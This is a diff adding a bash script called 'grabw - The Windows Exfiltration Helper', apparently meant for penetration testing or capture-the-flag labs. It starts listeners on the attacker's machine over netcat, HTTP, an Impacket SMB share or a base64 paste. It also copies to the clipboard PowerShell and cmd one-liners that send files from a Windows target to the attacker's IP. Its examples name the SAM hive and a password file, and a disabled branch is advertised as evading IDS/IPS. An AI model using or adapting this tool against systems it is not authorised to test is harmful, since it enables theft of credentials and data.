@@ -1,0 +1,143 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+# Define colors
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+BOLD_WHITE="\e[1;37m"
+WHITE="\e[37m"
+BRIGHT_WHITE="\e[97m"
+
+RESET="\e[0m"
+
+COLOR=$BRIGHT_WHITE
+
+
+OUT="${1:-}"
+CASE="${2:-nc}"
+ARG3="${3:-}"   # port or share name depending on case
+
+if [[ -z "$OUT" || "$1" == "-h" || "$1" == "--help" ]]; then
+  echo -e "${MAGENTA}HELP: grabw - The Windows Exfiltration Helper${RESET}"
+  echo -e "Usage: $(basename "$0") ${CYAN}<filename>${RESET} ${YELLOW}[method]${RESET} [port_or_share]"
+  echo -e "-----------------------------------------------------------------------"
+  
+  # Create a table-like structure for methods
+  printf "  ${YELLOW}%-10s${RESET} %-15s %s\n" "METHOD" "DEFAULT" "DESCRIPTION"
+  printf "  %-10s %-15s %s\n" "------" "-------" "-----------"
+  printf "  ${YELLOW}%-10s${RESET} %-15s %s\n" "nc" "Port 9001" "Raw TCP socket (fastest, no headers)"
+  printf "  ${GREEN}%-10s${RESET} %-15s %s\n" "http" "Port 8080" "POST request (strips HTTP headers automatically)"
+  printf "  ${GREEN}%-10s${RESET} %-15s %s\n" "smb" "Share 'data'" "Impacket SMB server (good for large directories)"
+  printf "  ${YELLOW}%-10s${RESET} %-15s %s\n" "offline" "Clipboard" "Base64 manual paste (no network required)"
+  printf "  ${RED}%-10s${RESET} %-15s %s\n" "openssl" "Port 443" "Encrypted tunnel (bypass basic IDS/IPS)"
+  
+  echo -e "\n${MAGENTA}EXAMPLES:${RESET}"
+  echo -e "  $(basename "$0") data.zip                # Listener on 9001"
+  echo -e "  $(basename "$0") config.xml http 80      # HTTP Listener on port 80"
+  echo -e "  $(basename "$0") SAM smb backups         # SMB share named 'backups'"
+  echo -e "  $(basename "$0") pass.txt offline        # Prep Base64 flow"
+  
+  echo -e "\n${CYAN}Note:${RESET} Commands for the Windows target are automatically copied to your ${YELLOW}clipboard${RESET}."
+  exit 1
+fi
+
+IP="${attacker:-$(ip -br addr show dev tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)}"
+[[ -z "$IP" ]] && { echo "[-] Could not determine tun0 IP; export \$attacker or connect VPN." >&2; exit 1; }
+
+case "$CASE" in
+  nc)
+    PORT="${ARG3:-9001}"
+    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+      echo "[!] Port ${PORT} requires root. Falling back to 9001."
+      PORT=9001
+    fi 
+    echo -e "${MAGENTA}=== NC ===${COLOR}"
+    echo -e "Get-Content C:\\Windows\\win.ini -Raw | nc ${IP} ${PORT}"
+    printf "%s" "Get-Content C:\\Windows\\win.ini -Raw | nc ${IP} ${PORT}" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+
+    echo
+    echo -e "${YELLOW}[*] Listening ${IP}:${PORT} → ${OUT}"
+    nc -l -p "${PORT}" > "${OUT}"
+    ;;
+
+  http)
+
+  PORT="${ARG3:-8080}"
+  if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+    echo "[!] Port ${PORT} requires root. Falling back to 8080."
+    PORT=8080
+  fi
+
+  echo -e "${MAGENTA}=== On TARGET ===${COLOR}"
+
+  CMD_PS="Invoke-WebRequest -Uri http://${IP}:${PORT} -Method POST -InFile ${OUT}"
+  echo -e "${WHITE}${CMD_PS}${RESET}"
+
+
+  printf "%s" "$CMD_PS" | xclip -selection clipboard
+  echo -e "${GREEN}→ PowerShell command copied to clipboard"
+
+  echo
+  echo -e "${YELLOW}[*] Listening on ${PORT}...${RESET}"
+
+  nc -lnvp "$PORT" -w 3 > "${OUT}.tmp"
+  sed '1,/^\r\{0,1\}$/d' "${OUT}.tmp" > "$OUT"
+  rm "${OUT}.tmp"
+;;
+
+  smb)
+    SHARE="${ARG3:-data}"
+    mkdir -p "./${SHARE}"
+    echo -e "${MAGENTA}=== SMB ===${COLOR}"
+    echo "copy ${OUT} \\\\${IP}\\${SHARE}\\${OUT}"
+    printf "%s" "copy ${OUT} \\\\${IP}\\${SHARE}\\${OUT}" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+
+    echo
+    echo -e "${YELLOW}[*] Starting SMB share /${SHARE}"
+    if command -v impacket-smbserver >/dev/null 2>&1; then
+      impacket-smbserver "${SHARE}" "./${SHARE}" -smb2support
+    else
+      python3 -m impacket.smbserver "${SHARE}" "./${SHARE}" -smb2support
+    fi
+    ;;
+
+  encrypted)
+    echo -e ${RED} Not implemented: this action is not available in this build. 
+  exit 1
+    
+    PORT="${ARG3:-4444}"
+    if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
+      echo "[!] Port ${PORT} requires root. Falling back to 4444."
+      PORT=4444
+    fi
+    echo "=== On TARGET (encrypt & send if OpenSSL/ncat available) ==="
+    echo "openssl enc -aes256 -pbkdf2 -in ${OUT} | ncat ${IP} ${PORT}"
+    echo
+    echo "[*] On ATTACKER: decrypting listener ${IP}:${PORT} → ${OUT} (Ctrl-C to stop)"
+    nc -l -p "${PORT}" | openssl enc -d -aes256 -pbkdf2 > "${OUT}"
+    ;;
+
+  offline)
+    echo -e "${MAGENTA}=== Offline ===${WHITE}"
+    echo
+    echo "[Convert]::ToBase64String([IO.File]::ReadAllBytes('${OUT}'))"
+    printf "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"\$PWD\\${OUT}\")) | Set-Clipboard" | xclip -selection clipboard
+    echo -e "${GREEN}→ helper copied to clipboard"
+
+    echo -e ${RESET}
+    echo "Paste base64 now (end with Ctrl-D):"
+
+    echo
+    cat | tr -d '[:space:]' | sed 's/[^a-zA-Z0-9+/=]//g' | base64 -d > "${OUT}"
+    echo -e "\n${CYAN}[+] Decoded and saved to: ${OUT}${RESET}"
+    ;;
+
+  *)
+    echo "[-] Unknown case: ${CASE}. Use: nc|http|smb|openssl|offline" >&2; exit 1 ;;
+esac
